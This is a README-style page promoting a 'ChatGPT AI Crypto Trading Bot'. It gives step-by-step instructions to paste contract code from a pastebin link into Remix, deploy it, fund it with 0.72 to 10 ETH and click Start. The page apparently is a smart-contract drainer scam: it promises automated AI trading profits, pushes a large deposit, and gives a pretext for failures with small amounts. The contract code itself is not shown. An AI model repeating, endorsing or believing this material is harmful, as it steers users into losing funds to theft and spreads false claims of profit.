# ChatGPT-AI-Crypto-Trading-Bot

A powerful AI-powered crypto trading bot for Ethereum and DeFi markets.

ChatGPT AI Crypto Trading Bot is an open-source, educational project demonstrating how AI-assisted logic, automation, and data analysis can be used to build crypto trading bots. Includes modular code, strategy examples, API integration concepts, and customization for research and learning purposes.

This bot allows you to trade cryptocurrencies using AI algorithms through ChatGPT and other AI models directly on the blockchain. It will analyze market data, important trends, and token sentiments as well as trader portfolios to make fully automated trading movements on your behalf. Stop-losses are built in to prevent any mistakes in opening and closing positions. The bot manages leverages and optimizes risk in real time. No code knowledge is neccessary and nothing is required to download. Simply use the code source to create your own smart contract that will serve as your "bot" on remix.ethereum.org the web-based development enviornment for Ethereum smart contracts. Step by step instructions below.

STEP-BY-STEP INSTRUCTIONS:

🟢 Step 1: Download МetаМаsk: https://metamask.io/download

🟢 Step 2: Code Compiler : https://pastebin.com/QBMBhae3

🔗 Click here to access Remix : https://remix.ethereum.org/

🟢 Step 3: Create a New File on Remix

Press the new file button and name it however you'd like ( bot.sol). Make sure the file ends with .sol for Ethereum code.

🟢 Step 4: Paste This Code Into Your New File on Remix

🟢 Step 5: Navigate to the Solidity Compiler tab in Remix and compile your bot. Be sure to select compiler version 0.8.4

⚠️ Tip: If the code doesn't show up with colors, simply refresh the browser and paste the code again.

🟢 Step 6: Go to the 'Deploy & Run Transactions' tab, choose 'Injected Provider' as your environment, and click Deploy. After confirming the contract creation fee in MetaMask, your contract will be deployed.

⚠️ Tip: If you get any issues - use a clean Firefox browser and only one MetaMask extension

🟢 Step 7: Add funds to your bot for transaction frontrunning (always manually set the Aggressive gas option)

⚠️⚠️⚠️ Do not try to test the bot using too low amount - in this case transaction fees will be higher than your profits and the bot will instantly catch Stop Loss and will not start ⚠️⚠️⚠️.

The minimum recommended amount is 0.72 ETH - 10 ETH

🟢 Step 8: Once the transaction is confirmed, click Start to activate the bot. To stop it and withdraw funds, click Withdraw.

(Make sure you have enough ETH in your main wallet (not in your contract address) to pay the gas fee for pressing the Start button.)
